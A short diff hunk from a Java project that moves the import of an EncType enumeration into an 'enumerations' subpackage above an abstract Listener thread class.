@@ -21,7 +21,7 @@ import io.netty.handler.ssl.SslContext;
 
 import javax.crypto.spec.SecretKeySpec;
 
-import subterranean.crimson.universal.EncType;
+import subterranean.crimson.universal.enumerations.EncType;
 import subterranean.crimson.universal.upnp.PortMapper;
 
 public abstract class Listener extends Thread {
